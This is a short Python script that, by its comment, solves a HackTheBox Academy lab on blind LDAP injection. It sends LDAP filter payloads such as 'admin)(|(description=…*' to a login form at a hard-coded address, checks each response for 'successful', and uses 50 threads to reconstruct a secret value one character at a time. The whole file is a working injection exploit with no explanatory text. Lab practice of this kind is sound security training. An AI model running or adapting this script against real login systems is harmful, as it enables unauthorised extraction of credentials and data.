#!/usr/bin/env python3
# Created this script to solve the HackTheBox Academy lab called 'LDAP - Data Exfiltration & Blind Exploitation'
# This script performs a Blind LDAP Injection Attack on the target 

import requests
import string
import subprocess
import concurrent.futures

# create character list
def charlist():
    chars= list(string.ascii_lowercase + string.digits + '{}_')
    return chars

def ldap_injection(char):
    url="83.136.252.57:42171" # update url
    proxies={"http":"http://127.0.0.1:8080"}
    headers={"Content-type":"application/x-www-form-urlencoded"}
    session= requests.Session()
    data=f"username=admin)(|(description={password}{char}*&password=test)"
    response= session.post(url=f"http://{url}/index.php", proxies=proxies, allow_redirects=True, headers=headers, data=data)
    
    process= subprocess.Popen("grep -i successful", shell=True, text=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, errors= process.communicate(input=response.text)
    if output:
        return char
    else:
        return None
    
try:
    password= ""
    count= 0
    while count < 40:
        chars = charlist()
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            future_to_test = {executor.submit(ldap_injection,char): (char) for char in chars}
            for future in concurrent.futures.as_completed(future_to_test):
                char = future_to_test[future]
                result = future.result()
                if result is not None:
                    print(f"Found char: {result}")
                    password +=result
                    count=0                                   
                else:
                    count+=1
                    pass
    print(password)
except KeyboardInterrupt:
    print("ctrl + c detected, exiting gracefully")
